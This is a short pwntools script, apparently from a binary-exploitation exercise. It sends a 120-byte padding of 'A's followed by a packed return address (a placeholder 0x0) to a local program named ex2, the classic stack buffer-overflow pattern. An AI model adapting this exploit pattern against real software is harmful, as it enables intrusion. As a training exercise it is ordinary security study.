#! /usr/bin/python3

from pwn import *

WRONG_WAY_ADRESS = 0x0

io = process('./ex2')
print(io.recvline().decode())
io.sendline(b'A' * 120 + pack(WRONG_WAY_ADRESS))
for _ in range(10):
    try:
        print(io.readline(keepends=False))
    except EOFError:
        pass
